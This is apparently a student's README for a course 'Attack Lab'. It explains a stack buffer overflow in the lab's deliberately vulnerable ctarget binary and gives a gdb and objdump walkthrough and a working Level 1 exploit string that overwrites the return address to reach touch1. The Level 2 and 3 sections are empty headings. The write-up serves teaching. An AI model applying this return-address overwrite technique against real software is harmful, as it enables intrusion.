# Attack Lab

## Introduction
Students are given binaries called ctarget and rtarget that have a buffer overflow bug. 
We are going to alter the behavior of the given targets via five increasingly difficult
exploits. The three attacks on ctarget use code injection. The two attacks on rtarget use
return-oriented programming.
The `src` folder includes all the files required to accomplish our 5 attacks:
```
README.txt:  A file describing the contents of the directory
ctarget:     An executable program vulnerable to code-injection attacks
rtarget:     An executable program vulnerable to return-oriented-programming attacks
cookie.txt:  An 8-digit hex code that you will use as a unique identifier in your attacks.
farm.c:      The source code of your target gadget farm, which you will use in generating
             return-oriented programming attacks.
hex2raw:     A utility to generate attack strings
```

Both CTARGET and RTARGET read strings from standard input.
```C
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

## Code Injection Attacks
Function `getbuf()` is called within `ctarget` by a function test having the following C code:
```C
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```
When `getbuf` executes its return statement, the program ordinarily resumes execution
within function test. We want to change this behavior by injecting code as the input
to `ctarget`.

### Level 1
Within the file `ctarget`, there is code for a function touch1 having the following C
representation:
```C
void touch1()
{
    vlevel = 1;    /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```
Our mission is to using a string input that can overflow the stack from `getbuf()` and
to redirect the program to `touch1()` when `getbuf()` returns.
Now let's go to the `src/` folder and analyze the disassembled code:
```bash
  unix > cd src
  unix > objdump -d ctarget > ctarget.d
```
Once opening the `ctarget.d` with an editor, we can see the `<test>` function starts
at address `0x401968`, `<getbuf>` starts at address `0x4017a8` and `<touch1>` starts
at address `0x4017c0`. So our level 1 task is to let `<getbuf>` return to address
`0x4017c0` instead of its original `0x401976`. We can do the analysis with `gdb`

```bash
  src > gdb ctarget
  (gdb) b test
  Breakpoint 1 at 0x401968: file visible.c, line 90.
  (gdb) r -q
  Starting program: ${Your_Root_Path}/03-Attack-Lab/src/ctarget -q
  Cookie: 0x59b997fa
  
  Breakpoint 1, test () at visible.c:90
  90      visible.c: No such file or directory.
  (gdb) layout asm
  (gdb) layout regs
```
The `-q` parameter is used to skip network related operations in `ctarget, which
you can run `ctarget -h` to view the concrete description of all valid parameters.
Then we use `si` to monitor the program by instruction. We can see that every time
a `callq` is executed, the address of the next instruction of `callq` will be pushed
to the stack. And once the stack popped up from the called function, the `retq` will
pop the stack and go to the address that previously stored.
Let's monitor the instruction when `<test>` calls `<getbuf>`:
```
  0x401971   callq 0x4017a8 <getbuf>
  0x401976   mov   %eax,%edx
  ...
```
When we use `si` to arrive at instruction `0x401971`, the current stack is `rsp=0x5561dca8`.
And we further type a `si` in `gdb` console, we can see that the stack is now
`rsp=0x5561dca0`, and the value of it:
```
  (gdb) x/8xb 0x5561dca0
  0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00  
```
Appearently, this is the original return address for `<getbuf>`. We are going to
use an input string to overwrite replace the stack frame at `0x5561dca0` by the address
of `<touch1>`. Next we will caluculate the size of bytes we need to inject in order
to reach `0x5561dca0`.
```
  <getbuf>
  0x4017a8:   sub    $0x28,%rsp
  0x4017ac:   mov    %rsp,%rdi
  0x4017af:   callq  401a40 <Gets>
  0x4017b4:   mov    $0x1,%eax
  0x4017b9:   add    $0x28,%rsp
  0x4017bd:   retq
```
According to the disassembled code, `<getbuf>` applies 40 bytes to stack, which means
that we need to first inject 40 bytes to occupy the stack of `<getbuf>` and then followed
by 8 bytes of address for `<touch1>` for the `retq` to redirect. Attention before the
end of our exploit, `00` is not allowed as it indicates end of C string. One possible
solution can be
```
  66 75 63 6b 47 46 57 21
  66 75 63 6b 47 46 57 21
  66 75 63 6b 47 46 57 21
  66 75 63 6b 47 46 57 21
  66 75 63 6b 47 46 57 21
  C0 17 40 00 00 00 00 00
```
Let's put the solution to file `ctarget.exploit.l1.txt`, and we can validate it by
executing from the following command `/src`
```
  03-Attack-Lab/src > cat ctarget.exploit.l1.txt | ./hex2raw | ./ctarget -q
    Cookie: 0x59b997fa
    Type string:Touch1!: You called touch1()
    Valid solution for level 1 with target ctarget
    PASS: ...
```

### Level 2

### Level 3
